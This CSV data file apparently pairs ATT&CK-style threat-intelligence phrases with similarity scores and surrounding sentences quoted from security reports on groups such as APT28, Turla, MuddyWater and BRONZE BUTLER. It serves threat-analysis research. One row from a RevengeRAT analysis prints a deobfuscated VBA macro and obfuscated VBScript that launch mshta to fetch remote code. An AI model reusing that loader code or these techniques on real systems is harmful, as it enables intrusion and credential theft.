phrase|similarity|adjacent_sentences
BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.|0.7885133392916067|['Figure 13 shows the scheduled task that executes zrun.bat (a batch file) using the at command.Figure 13.', 'Scheduled task registration.', '(Source: Secureworks)Figure 14 shows the batch file (zrun.bat) executing, which adds a registry entry that auto-executes the malware.Figure 14.', 'Registry entry added to auto-execute malware.', '(Source: Secureworks)CTU researchers have also observed BRONZE BUTLER giving malware the same name as an existing document file on the file share server to cause users to unwittingly launch and install the malware on additional systems (see Figure 15).Figure 15.', 'Malware given the same name as an existing document file.', '(Source: Secureworks)ExfiltrationBRONZE BUTLER typically creates a list of files (i.e., a shopping list) from compromised hosts and file-share servers.', 'If the list is short, the group exfiltrates the files directly.', 'For large lists, the threat actors use the following procedure:Use malware to upload the large list of enumerated files to the C2 server.Select specific files to steal, creating a new list.Use downloaders or other malware to send the new list to a compromised host.Use archiving software to collect files in a password-protected archive.Use an uploader or other malware to send the archived files to an attacker-controlled server.', 'The uploader software is proprietary to this group, but Datper and xxmm also contain an uploading feature.', 'When exfiltration is complete, the uploader (or Datper or xxmm) immediately uses the del command to delete the RAR archives.Figure 16 shows BRONZE BUTLER extracting a new list of files and archiving a specific file into RAR format for exfiltration.Figure 16.']
A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.|0.7986572419586273|"['[3]EnterpriseT1105Ingress Tool TransferPatchworkpayloads download additional files from the C2 server.', '[8][3]EnterpriseT1559.002Inter-Process Communication:Dynamic Data ExchangePatchworkleveraged the DDE protocol to deliver their malware.', '[3]EnterpriseT1036.005Masquerading:Match Legitimate Name or LocationPatchworkinstalled its payload in the startup programs folder as ""Baidu Software Update.""', 'The group also adds its second stage payload to the startup programs as ""Net Monitor.', '""[1]They have also droppedQuasarRATbinaries as files named microsoft_network.exe and crome.exe.', '[4]EnterpriseT1112Modify RegistryAPatchworkpayload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.', '[3]EnterpriseT1027.001Obfuscated Files or Information:Binary PaddingPatchworkapparently alteredNDiskMonitorsamples by adding four bytes of random letters in a likely attempt to change the file hashes.', '[3].002Obfuscated Files or Information:Software PackingAPatchworkpayload was packed with UPX.', '[8].005Obfuscated Files or Information:Indicator Removal from ToolsPatchworkapparently alteredNDiskMonitorsamples by adding four bytes of random letters in a likely attempt to change the file hashes.', '[3].010Obfuscated Files or Information:Command ObfuscationPatchworkhas obfuscated a script with Crypto Obfuscator.', '[3]EnterpriseT1588.002Obtain Capabilities:ToolPatchworkhas obtained and used open-source tools such asQuasarRAT.']"
HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.|0.8453578968429508|"['This is the case with Ursnif.', 'It is being delivered in three stages: VBA macro [doc] ---> HTML [mshta]---> DLL [regsvr32] (Stage 1) (Stage 2) (Stage 3) Why mshta?', ""One of the reasons malware authors try to switch to new delivery methods is to bypass security defenses, leave fewer footprints, and blend with existing system noise on the victim's machine."", 'This seems to be the reason for using mshta in this new campaigndespite using PowerShell as the second-stage payload in the past.', 'A brief description of mshta Mshta.exe is a utility that executes Microsoft HTML Applications (HTAs).', 'HTAs are stand-alone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.', 'Adversaries can use mshta.exe to proxy execution of malicious .hta files and JavaScript or VBScript through a trusted Windows utility.', 'Mshta.exe can be used to bypass application whitelisting solutions, which do not account for its potential use, and digital certificate validation.', ""Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings."", ""Doc file analysis [First stage] As mentioned earlier, the malware's initial payload was being delivered via document files with the name info_03_24.doc during the time of our analysis."", 'The document didnt contain any exploits but used macro code to drop the second-stage payload.']"
HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.|0.9152354628197026|['This is because proxy execution of malicious .hta files Mshta will execute HTA content in files with any extension (or none at all) as long and Javascript or VBScript through as the file extension is not mapped to a text/plain MIME type (e.g., Mshta will not a trusted Windows utility.', 'There are execute a file with a .txt extension).', 'To further disguise Mshta execution, TA551 several examples of different types of renamed the binary in attempts to evade detection logic, which relied on Mshta threats leveraging mshta.exe during executing with its expected filename of mshta.exe.', 'initial compromise and for execution of code.', 'Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.', 'Detection HTAs are standalone applications that execute using the same models and Collection requirements technologies of Internet Explorer, but outside of the browser.', 'Process and command-line monitoring Monitoring process execution and command-line parameters will offer defenders visibility into many behaviors associated with malicious abuse of Mshta.', 'Similarly, process lineage is also helpful for detecting adversary use of Mshta.', 'At a minimum, collect parent-child process relationships, and, if possible, consider collecting information about grandparent relationships too.', 'Process metadata We observed multiple adversaries this year renaming the Mshta binary to evade brittle detection logic.', 'While we cover this extensively in our analysis of T1036.003: Rename System Utilities, binary metadata like internal process names are an effective data source to determine the true identity of a given process.']
HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.|1.0|"['The following info-graphics summarize the infection chain dissected in the sections below, starting from the weaponized Office document, initially delivered through malicious emails, to the final RevengeRAT payload.Figure 1.', 'RG campaign infection chainThe Macro DropperHash7c0a69f93831dcd550999b765c7922392dd0d994b0241071545749e865cc9854ThreatDropperBrief DescriptionXLS Macro dropperSsdeep768:kCSk3hOdsylKlgxopeiBNhZFGzE+ cL2kdAJ7evT8RsFbQ:kDk3hOdsylKlgxopeiBNhZFGzE+cL2ktTable 1: Information about the RevengeRAT malicious macro dropperAll the infection starts with a malicious XLS document weaponized with an embedded macro.', 'The VB code is polluted by a multitude of junk instructions and after a cleaning phase we isolated the essence of the malicious code.Public Function Workbook_Open() \trgh1 = YUcIFcEAA(""tzo{h\'o{{wA66ip"", ""7"") \trgh2 = YUcIFcEAA(""{5s6"", ""7"") \trgh3 = YUcIFcEAA(""7O^7ixXmxmxm"", ""5"") \trgh = rgh1 + rgh2 + rgh3 \tShell rgh End Function Public Function YUcIFcEAA(Sg1NdPNeR As String, jxvMDn0vV As Integer)  Dim PFc88so50 As Integer  For PFc88so50 = 1 To Len(Sg1NdPNeR)  Mid(Sg1NdPNeR, PFc88so50, 1) = Chr(Asc(Mid(Sg1NdPNeR, PFc88so50, 1)) - jxvMDn0vV)  Next PFc88so50  YUcIFcEAA = Sg1NdPNeR End FunctionCode Snippet 1: real core of the macroFigure 2: Command used to start the infectionA quick and dirty manipulation of the script enabled us to easily bypass the code obfuscation techniques protecting the next stage of the infection: the invocation of a Microsoft HTML Application hosted in a remote location.The macro has the only purpose to run the mshta command.', 'As defined by theMitre, Mshta.exe is a utility that executes Microsoft HTML Applications (HTA).', 'HTA files have the file extension .hta.', 'HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.', '.The Hidden HTAThe malware retrieves the HTA application to run from a remote host behind the Bitly shortening service.', 'The target page is the rg.html, downloaded from https[://createdbymewithdeniss[ .blogspot[.com/p/rg[.html.', 'Even in this case, like in the Roma255 campaign, the attacker abused the Blogger platform to hide the malicious code in plain sight.Figure 3: Fake Blogspot pageThe page does not embed any binaries or malicious links, but navigating its source code, it reveals packed HTML code dynamically injected into the page during the rendering.Figure 4: Malicious code contained in the malicious blogspot siteThis additional piece of script is specifically designed to be executed by the mshta utility.', 'It is a VBScript code creating a WScript.Shell object, a particular object decisely not designed to be loaded into regular web browsers engines.<script language=""VBScript""> Set Xkasdj2 = CreateObject(StrReverse(StrReverse(""WScript.Shell""))) Xa_aw1 = StrReverse(StrReverse(""h"")) + StrReverse(StrReverse(StrReverse(StrReverse(""t""))) + StrReverse(StrReverse(StrReverse(StrReverse(""t""))) + StrReverse(StrReverse(""p"")) + StrReverse("":"") + StrReverse(StrReverse(StrReverse(StrReverse(""/""))) + StrReverse(StrReverse(StrReverse(StrReverse(""/""))) + StrReverse(StrReverse(StrReverse(StrReverse(""w""))) + StrReverse(StrReverse(StrReverse(StrReverse(""w""))) + StrReverse(StrReverse(StrReverse(StrReverse(""w""))) + StrReverse(StrReverse("".""))', '+ StrReverse(StrReverse(""p"")) + StrReverse(StrReverse(""a"")) + StrReverse(StrReverse(""s"")) + StrReverse(StrReverse(StrReverse(StrReverse(""t""))) + StrReverse(""e"") + StrReverse(""b"") + StrReverse(""i"") + StrReverse(""n"") + StrReverse(StrReverse("".""))']"
MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.|0.8347732635976163|"['Compile After T1027.004 MuddyWater has used the .NET csc.exe tool to compile executables from Delivery downloaded C# code.', 'Masquerading: T1036.005 MuddyWater has disguised malicious executables and used filenames and Registry Match Legitimate key names associated with Windows Defender.', 'E.g., Small Sieve uses variations of Name or Location Microsoft (Microsift) and Outlook in its filenames to attempt to avoid detection during casual inspection.', 'Deobfuscate/Decode T1140 MuddyWater decoded Base64-encoded PowerShell commands using a VBS file.', 'Files or Information Signed Binary Proxy T1218.003 MuddyWater has used CMSTP.exe and a malicious .INF file to execute its Execution: CMSTP POWERSTATS payload.', 'Signed Binary Proxy T1218.005 MuddyWater has used mshta.exe to execute its POWERSTATS payload and to Execution: Mshta pass a PowerShell one-liner for execution.', 'Signed Binary Proxy T1218.011 MuddyWater has used malware that leveraged rundll32.exe in a Registry Run Execution: Rundll32 key to execute a .dll .', 'Execution Guardrails T1480 The Small Sieve payload used by MuddyWater will only execute correctly if the word Platypus is passed to it on the command line.', ""Impair Defenses: T1562.001 MuddyWater can disable the system's local proxy settings."", 'Disable or Modify Tools 5/12Technique Title ID Use Credential Access OS Credential T1003.001 MuddyWater has performed credential dumping with Mimikatz and Dumping: LSASS procdump64.exe .', 'Memory OS Credential T1003.004 MuddyWater has performed credential dumping with LaZagne.']"
Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.|0.8130295502520429|"['The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].', '[24] Specifically in this case, credentials of cloud accounts [T1078.004] were obtained and abused.', '[25]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.T1078.004Valid Accounts: Cloud AccountsAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Defense Evasion[TA0005]Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.', 'The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [T1027].', '[26]IDNameDescriptionT1027Obfuscated Files or InformationAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.Credential Access[TA0006]Credential Access consists of techniques for stealing credentials like account names and passwords.', 'The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [T1003.003].', '[27]The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [T1110.003].', '[28]IDNameDescriptionT1003.003OS Credential Dumping: NTDSAdversaries may attempt to access or create a copy of the Active Directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.T1110.003Brute Force: Password SprayingAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.', 'The adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [T1083].', '[29] In addition, the adversary attempted to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain or forest environments [T1482].', ""[30]IDNameDescriptionT1083File and Directory DiscoveryAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.T1482Domain Trust DiscoveryAdversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.Collection [TA0009]Collection consists of both the techniques adversaries may use to gather information and the sources that information is collected from that are relevant to the adversary's objectives.""]"
APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.|0.7517524102771034|['[38][36][11][18][17]EnterpriseT1588.002Obtain Capabilities:ToolAPT28has obtained and used open-source tools likeKoadic,Mimikatz, andResponder.', '[11][22][39]EnterpriseT1137.002Office Application Startup:Office TestAPT28has used the Office Test persistence mechanism within Microsoft Office by adding the Registry keyHKCU\\\Software\\\Microsoft\\\Office test\\\Special\\\Perfto execute code.', '[43]EnterpriseT1003OS Credential DumpingAPT28regularly deploys both publicly available (ex:Mimikatz) and custom password retrieval tools on victims.', '[44][3][14].001LSASS MemoryAPT28regularly deploys both publicly available (ex:Mimikatz) and custom password retrieval tools on victims.', '[44][3]They have also dumped the LSASS process memory using the MiniDump function.', '[2].003NTDSAPT28has used the ntdsutil.exe utility to export the Active Directory database for credential access.', '[2]EnterpriseT1120Peripheral Device DiscoveryAPT28uses a module to receive a notification every time a USB mass storage device is inserted into a victim.', '[33]EnterpriseT1566.001Phishing:Spearphishing AttachmentAPT28sent spearphishing emails containing malicious Microsoft Office and RAR attachments.', '[36][10][11][3][22][17][21][16].002Phishing:Spearphishing LinkAPT28sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.', '[3][13][14][16]EnterpriseT1598Phishing for InformationAPT28has used spearphishing to compromise credentials.', '[31][16].003Spearphishing LinkAPT28has conducted credential phishing campaigns with embedded links to attacker-controlled domains.']
Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.|0.826845427946801|"['[11]EnterpriseT1615Group Policy DiscoveryTurlasurveys a system upon check-in to discover Group Policy details using thegpresultcommand.', '[14]EnterpriseT1562.001Impair Defenses:Disable or Modify ToolsTurlahas used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.', '[11]EnterpriseT1105Ingress Tool TransferTurlahas used shellcode to download Meterpreter after compromising a victim.', '[16]EnterpriseT1570Lateral Tool TransferTurlaRPC backdoors can be used to transfer files to/from victim machines on the local network.', '[11][18]EnterpriseT1112Modify RegistryTurlahas modify Registry values to store payloads.', '[11][18]EnterpriseT1106Native APITurlaand its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.', '[11]EnterpriseT1027.005Obfuscated Files or Information:Indicator Removal from ToolsBased on comparison ofGazerversions,Turlamade an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.', ""[2].010Obfuscated Files or Information:Command ObfuscationTurlahas used encryption (including salted 3DES viaPowerSploit'sOut-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads."", '[11].011Obfuscated Files or Information:Fileless StorageTurlahas used the Registry to store encrypted and encoded payloads.', '[11][18]EnterpriseT1588.001Obtain Capabilities:MalwareTurlahas used malware obtained after compromising other threat actors, such asOilRig.', '[20][21].002Obtain Capabilities:ToolTurlahas obtained and customized publicly-available tools likeMimikatz.']"
Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.|0.9201661825794446|"['Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.', 'Adversaries may execute their own malicious payloads by Dynamic Linker Hijacking T1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.']"
It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.|0.8262620688053434|"['The second file (keyword_parm.txt) is a list of keywords that is read into keywordVec.', 'https://www.fireeye.com/blog/threat-research/2019/10/messagetap-who-is-reading-your-text-messages.html 1/511/1/2019 MESSAGETAP: Whos Reading Your Text Messages?', '| FireEye Inc Both files are deleted from disk once the configuration files are read and loaded into memory.', 'After loading the keyword and phone data files, MESSAGETAP begins monitoring all network connections to and from the server.', 'It uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers.', 'It continues parsing protocol layers including SCTP, SCCP, and TCAP.', 'Finally, the malware parses and extracts SMS message data from the network traffic: 1.', 'SMS message contents 2.', 'The IMSI number 3.', 'The source and destination phone numbers The malware searches the SMS message contents for keywords from the keywordVec list, compares the IMSI number with numbers from the imsiMap list, and checks the extracted phone numbers with the numbers in the phoneMap list.', 'Figure 1: General Overview Diagram of MESSAGETAP If the SMS message text contains one of the keywordVec values, the contents are XORed and saved to a path with the following format: /etc/<redacted>/kw_<year><month><day>.csv https://www.fireeye.com/blog/threat-research/2019/10/messagetap-who-is-reading-your-text-messages.html 2/511/1/2019 MESSAGETAP: Whos Reading Your Text Messages?']"
Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.|0.883776066058274|"['Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.']"
Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.|0.835411725477968|"['Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.']"
Silence has used port 444 when sending data about the system from the client to the server.|0.7527033205118696|['Thus, the application under investigation can be used to collect other data, save the data (as an argument of the command line when launched) into the registry, and then send it.', 'A new registry key is created called Types Supported.', 'It is not used anywhere further: HKLM\\\SYSTEM\\\CurrentControlSet\\\Services\\\Eventlog\\\Application\\\ Microsoft Audit Service\\\TypesSupported = 7 The file under investigation tries to connect to the 185.29.10[.', ']117:443 network node The program features two ports: 443 and 444.', 'The first one, 443, is a remote port, which should be tapped to connect with C2.', 'The second one, 444, is used only once when sending data about the system from the client to the server.', 'Stated in the file but not used ports for possible connections: 3389 and 8081 The connection is established at the layer of TCP sockets (Http and Https protocols are not used) If the connection is not established, the attempts to connect and send files will be repeated every 42 seconds or 1 minute (in two different threads).', 'After successful connection, the server gets information about the system: a string with 16 random characters, PC name, user name, system right (user SID), country\\\locale, local IP, number of the second port embedded into the build.', 'The length of the statistics package is always 208 bytes.', '56 The file performs 3 different requests to the server.', 'If the responses are not equal to zero, it makes 4 more requests in a row (4th,5th,6th,7th requests).']
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.|0.7755573088501492|['The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].', '[23]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Privilege Escalation[TA0004]Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.', 'The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].', '[24] Specifically in this case, credentials of cloud accounts [T1078.004] were obtained and abused.', '[25]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.T1078.004Valid Accounts: Cloud AccountsAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Defense Evasion[TA0005]Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.', 'The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [T1027].', '[26]IDNameDescriptionT1027Obfuscated Files or InformationAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.Credential Access[TA0006]Credential Access consists of techniques for stealing credentials like account names and passwords.', 'The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [T1003.003].', '[27]The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [T1110.003].', '[28]IDNameDescriptionT1003.003OS Credential Dumping: NTDSAdversaries may attempt to access or create a copy of the Active Directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.T1110.003Brute Force: Password SprayingAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.', 'The adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [T1083].']
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.|0.9345827860299124|"['Technique Title ID Use Network Connection Adversaries may perform network connection enumeration to T0840 Enumeration discover information about device communication patterns.', 'Adversaries may obfuscate command and control traffic to make Data Obfuscation T1001 it more difficult to detect.', 'Adversaries may impersonate legitimate protocols or web service Protocol Impersonation T1001.003 traffic to disguise command and control activity and thwart analysis efforts.', 'Page 43 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to dump credentials to obtain account OS Credential Dumping T1003 login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.', 'Adversaries may use rootkits to hide the presence of programs, Rootkit T1014 files, network connections, services, drivers, and other system components.', 'Adversaries may attempt to make an executable or file difficult to Obfuscated Files or T1027 discover or analyze by encrypting, encoding, or otherwise Information obfuscating its contents on the system or in transit.', 'Adversaries may perform software packing or virtual machine Software Packing T1027.002 software protection to conceal their code.', 'Adversaries may attempt to manipulate features of their artifacts Masquerading T1036 to make them appear legitimate or benign to users and/or security tools.', 'Adversaries may sniff network traffic to capture information about Network Sniffing T1040 an environment, including authentication material passed over the network.', 'Adversaries may attempt to get a listing of services running on Network Service Discovery T1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation.', 'Adversaries may inject dynamic-link libraries (DLLs) into Dynamic-link Library T1055.001 processes in order to evade process-based defenses as well as Injection possibly elevate privileges.']"
Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.|0.7760152000729671|"['[24] Specifically in this case, credentials of cloud accounts [T1078.004] were obtained and abused.', '[25]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.T1078.004Valid Accounts: Cloud AccountsAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Defense Evasion[TA0005]Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.', 'The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [T1027].', '[26]IDNameDescriptionT1027Obfuscated Files or InformationAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.Credential Access[TA0006]Credential Access consists of techniques for stealing credentials like account names and passwords.', 'The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [T1003.003].', '[27]The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [T1110.003].', '[28]IDNameDescriptionT1003.003OS Credential Dumping: NTDSAdversaries may attempt to access or create a copy of the Active Directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.T1110.003Brute Force: Password SprayingAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.', 'The adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [T1083].', '[29] In addition, the adversary attempted to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain or forest environments [T1482].', ""[30]IDNameDescriptionT1083File and Directory DiscoveryAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.T1482Domain Trust DiscoveryAdversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.Collection [TA0009]Collection consists of both the techniques adversaries may use to gather information and the sources that information is collected from that are relevant to the adversary's objectives."", 'The adversary leverages information repositories, such as SharePoint, to mine valuable information [T1213.002].']"
